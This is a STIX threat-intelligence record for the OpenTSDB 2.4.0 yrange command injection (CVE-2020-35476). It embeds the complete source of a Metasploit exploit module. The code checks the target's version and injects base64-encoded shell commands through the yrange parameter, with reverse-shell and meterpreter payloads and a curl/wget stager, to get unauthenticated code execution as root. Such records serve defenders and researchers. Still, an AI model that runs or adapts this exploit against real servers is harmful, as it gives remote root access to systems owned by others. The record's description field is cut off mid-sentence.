{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b3566770-bb86-48eb-b9e8-1422de84f1d2",
    "created": "2024-08-14T17:02:55.358172Z",
    "modified": "2024-08-14T17:02:55.358176Z",
    "name": "OpenTSDB 2.4.0 unauthenticated command injection",
    "description": " This module exploits an unauthenticated command injection vulnerability in the yrange parameter in OpenTSDB through",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/opentsdb_yrange_cmd_injection.rb",
            "external_id": "opentsdb_yrange_cmd_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-35476"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/OpenTSDB/opentsdb/issues/2051#disclosureandPoC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OpenTSDB 2.4.0 unauthenticated command injection',\n        'Description' => %q{\n          This module exploits an unauthenticated command injection\n          vulnerability in the yrange parameter in OpenTSDB through\n          2.4.0 (CVE-2020-35476) in order to achieve unauthenticated\n          remote code execution as the root user.\n\n          The module first attempts to obtain the OpenTSDB version via\n          the api. If the version is 2.4.0 or lower, the module\n          performs additional checks to obtain the configured metrics\n          and aggregators. It then randomly selects one metric and one\n          aggregator and uses those to instruct the target server to\n          plot a graph. As part of this request, the yrange parameter is\n          set to the payload, which will then be executed by the target\n          if the latter is vulnerable.\n\n          This module has been successfully tested against OpenTSDB\n          version 2.3.0.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Shai rod', # @nightrang3r - discovery and PoC\n          'Erik Wynter' # @wyntererik - Metasploit\n        ],\n        'References' => [\n          ['CVE', '2020-35476'],\n          ['URL', 'https://github.com/OpenTSDB/opentsdb/issues/2051'] # disclosure and PoC\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 4242\n        },\n        'Platform' => %w[unix linux],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'CmdStagerFlavor' => %w[bourne curl wget],\n        'Targets' => [\n          [\n            'Automatic (Unix In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' },\n              'Type' => :unix_memory\n            }\n          ],\n          [\n            'Automatic (Linux Dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2020-11-18',\n        'DefaultTarget' => 1,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('TARGETURI', [true, 'The base path to OpenTSDB', '/']),\n    ]\n  end\n\n  def check\n    # sanity check to see if the target is likely OpenTSDB\n    res1 = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    })\n\n    unless res1\n      return CheckCode::Unknown('Connection failed.')\n    end\n\n    unless res1.code == 200 && res1.get_html_document.xpath('//title').text.include?('OpenTSDB')\n      return CheckCode::Safe('Target is not an OpenTSDB application.')\n    end\n\n    # get the version via the api\n    res2 = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'api', 'version')\n    })\n\n    unless res2\n      return CheckCode::Unknown('Connection failed.')\n    end\n\n    unless res2.code == 200 && res2.body.include?('version')\n      return CheckCode::Detected('Target may be OpenTSDB but the version could not be determined.')\n    end\n\n    begin\n      parsed_res_body = JSON.parse(res2.body)\n    rescue JSON::ParserError\n      return CheckCode::Detected('Could not determine the OpenTSDB version: the HTTP response body did not match the expected JSON format.')\n    end\n\n    unless parsed_res_body.is_a?(Hash) && parsed_res_body.key?('version')\n      return CheckCode::Detected('Could not determine the OpenTSDB version: the HTTP response body did not match the expected JSON format.')\n    end\n\n    version = parsed_res_body['version']\n\n    begin\n      if Rex::Version.new(version) <= Rex::Version.new('2.4.0')\n        return CheckCode::Appears(\"The target is OpenTSDB version #{version}\")\n      else\n        return CheckCode::Safe(\"The target is OpenTSDB version #{version}\")\n      end\n    rescue ArgumentError => e\n      return CheckCode::Unknown(\"Failed to obtain a valid OpenTSDB version: #{e}\")\n    end\n  end\n\n  def select_metric\n    # check if any metrics have been configured. if not, exploitation cannot work\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'suggest'),\n      'vars_get' => { 'type' => 'metrics' }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection failed.')\n    end\n\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Received unexpected status code #{res.code} when checking the configured metrics\")\n    end\n\n    begin\n      metrics = JSON.parse(res.body)\n    rescue JSON::ParserError\n      fail_with(Failure::UnexpectedReply, 'Received unexpected reply when checking the configured metrics: The response body did not contain valid JSON.')\n    end\n\n    unless metrics.is_a?(Array)\n      fail_with(Failure::UnexpectedReply, 'Received unexpected reply when checking the configured metrics: The response body did not contain a JSON array')\n    end\n\n    if metrics.empty?\n      fail_with(Failure::NoTarget, 'Failed to identify any configured metrics. This makes exploitation impossible')\n    end\n\n    # select a random metric since any will do\n    @metric = metrics.sample\n    print_status(\"Identified #{metrics.length} configured metrics. Using metric #{@metric}\")\n  end\n\n  def select_aggregator\n    # check the configured aggregators and select one at random\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'aggregators')\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection failed.')\n    end\n\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Received unexpected status code #{res.code} when checking the configured aggregators\")\n    end\n\n    begin\n      aggregators = JSON.parse(res.body)\n    rescue JSON::ParserError\n      fail_with(Failure::UnexpectedReply, 'Received unexpected reply when checking the configured aggregators: The response body did not contain valid JSON.')\n    end\n\n    unless aggregators.is_a?(Array)\n      fail_with(Failure::UnexpectedReply, 'Received unexpected reply when checking the configured aggregators: The response body did not contain a JSON array')\n    end\n\n    if aggregators.empty?\n      fail_with(Failure::NoTarget, 'Failed to identify any configured aggregators. This makes exploitation impossible')\n    end\n\n    # select a random aggregator since any will do\n    @aggregator = aggregators.sample\n    print_status(\"Identified #{aggregators.length} configured aggregators. Using aggregator #{@aggregator}\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    # use base64 to avoid special char escape hell (specifying BadChars did not help)\n    cmd = \"'echo #{Base64.strict_encode64(cmd)} | base64 -d | /bin/sh'\"\n    start_time = rand(20.year.ago..10.year.ago) # this should be a date far enough in the past to make sure we capture all possible data\n    start_value = start_time.strftime('%Y/%m/%d-%H:%M:%S')\n    end_time = rand(1.year.since..10.year.since) # this can be a date in the future to make sure we capture all possible data\n    end_value = end_time.strftime('%Y/%m/%d-%H:%M:%S')\n\n    get_vars = {\n      'start' => start_value,\n      'end' => end_value,\n      'm' => \"#{@aggregator}:#{@metric}\",\n      'yrange' => \"[1:system(#{Rex::Text.uri_encode(cmd)})]\",\n      'wxh' => \"#{rand(800..1600)}x#{rand(400..600)}\",\n      'style' => 'linespoint'\n    }\n\n    exploit_uri = '?'\n    get_vars.each do |key, value|\n      exploit_uri += \"#{key}=#{value}&\"\n    end\n    exploit_uri += 'json'\n\n    # using a raw request because cgi was leading to encoding issues\n    send_request_raw({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'q' + exploit_uri)\n    }, 0) # we don't have to wait for a reply here\n  end\n\n  def exploit\n    select_metric\n    select_aggregator\n    if target.arch.first == ARCH_CMD\n      print_status('Executing the payload')\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(background: true)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-11-18",
    "x_mitre_platforms": [
        "linux'"
    ]
}